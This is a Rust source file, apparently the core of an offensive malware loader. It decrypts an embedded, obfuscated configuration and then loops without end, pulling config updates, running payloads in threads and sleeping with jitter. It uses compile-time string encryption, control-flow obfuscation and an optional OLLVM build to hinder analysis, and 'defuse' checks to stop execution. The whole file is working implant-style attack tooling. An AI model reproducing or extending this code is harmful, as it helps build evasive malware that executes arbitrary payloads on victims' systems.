use crate::config::Config;
use std::thread;

//#[macro_use]
//extern crate litcrypt;
//use_litcrypt!();

use cryptify::encrypt_string;


use crate::dataoperation::un_apply_all_dataoperations;
use crate::dataoperation::DataOperation;
use crate::payload::Payload;
use crate::payload_util::print_running_thread;

use log::error;
use log::info;
extern crate env_logger;
use cryptify;

// ------ STANDARD compilation
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes"));
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes.dataop.obfuscated"));
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes.dataop.obfuscated.dataop"));

// ------ OLLVM compilation from docker
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes");
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes.dataop.obfuscated");
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes.dataop.obfuscated.dataop");

pub fn run_loader() {
    #[cfg(feature = "info")]
    #[cfg(not(feature="debug"))]
    env_logger::builder().filter_level(log::LevelFilter::Info).init();

    #[cfg(feature = "debug")]
    env_logger::builder().filter_level(log::LevelFilter::Debug).init();

    cryptify::flow_stmt!();
    let session_id: String = uuid::Uuid::new_v4().to_string();
    info!("{}{}", encrypt_string!("[+] session_id "), session_id);
    info!("");

    let initial_config_encrypted = INITIAL_CONFIG_ENCRYPTED.to_vec();
    let obfuscated_config_decrypt_key = OBFUSCATED_CONFIG_DECRYPT_KEY.to_vec();
    let decrypt_key_obfuscation_steps_zlib = DECRYPT_KEY_OBFUSCATION_STEPS.to_vec();
    let decrypt_key_obfuscation_steps = un_apply_all_dataoperations(
        vec![DataOperation::ZLIB],
        decrypt_key_obfuscation_steps_zlib,
    )
    .unwrap();
    let ope_for_data_op: Vec<DataOperation> =
        serde_json::from_slice(decrypt_key_obfuscation_steps.as_slice()).unwrap();
    let initial_config_decrypt_key =
        un_apply_all_dataoperations(ope_for_data_op, obfuscated_config_decrypt_key).unwrap();
    let initial_config_decrypt_key_dataoperation: Vec<DataOperation> =
        serde_json::from_slice(initial_config_decrypt_key.as_slice()).unwrap();

    info!("{}", encrypt_string!("[+] DECRYPT initial config"));
    let initial_config_decrypted = un_apply_all_dataoperations(
        initial_config_decrypt_key_dataoperation,
        initial_config_encrypted,
    )
    .unwrap();
    info!("{}", encrypt_string!("[+] DECRYPTED!"));

    let mut config: Config = serde_json::from_slice(initial_config_decrypted.as_slice()).unwrap();
    info!("{}", encrypt_string!("[+] VERIFY initial config"));
    config.verify_newconfig_signature(&config).unwrap();
    info!("{}{}", encrypt_string!("[+] VERIFIED!"), "\n");

    let mut running_thread: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
    let mut loop_nb = 1;
    loop {
        info!(
            "{}{}{}",
            encrypt_string!("[+] BEGIN LOOP "),
            loop_nb,
            encrypt_string!(" --------------------------------------------------------")
        );
        info!("{}{:?}", encrypt_string!("[+] Active LOADER: "), config);

        info!("{}", encrypt_string!("[+] DEFUSE UPDATE config"));
        if config.stop_defuse(&config.defuse_update) {
            error!("{}", encrypt_string!("[!] DEFUSE STOP update config"));
        } else {
            info!("{}", encrypt_string!("[+] UPDATE config"));
            let mut running_payload: Vec<Payload> = vec![];
            for t in &running_thread {
                running_payload.push(t.1.clone());
            }

            config = config.update_config(&session_id, &running_payload);
            info!("{}", encrypt_string!("[+] DEFUSE payload exec"));
            if config.stop_defuse(&config.defuse_payload) {
                error!("{}", encrypt_string!("[!] DEFUSE STOP the payload exec"));
            } else {
                info!("{}", encrypt_string!("[+] PAYLOADS exec"));
                config.exec_payloads(&mut running_thread);
            }
        }

        print_running_thread(&mut running_thread);
        //TODO wait all thread to finish -> new option
        config.sleep_and_jitt();
        info!(
            "{}{}{}{}",
            encrypt_string!("[+] END LOOP "),
            loop_nb,
            encrypt_string!(" ----------------------------------------------------------"),
            "\n"
        );
        loop_nb = loop_nb + 1;
    }
}
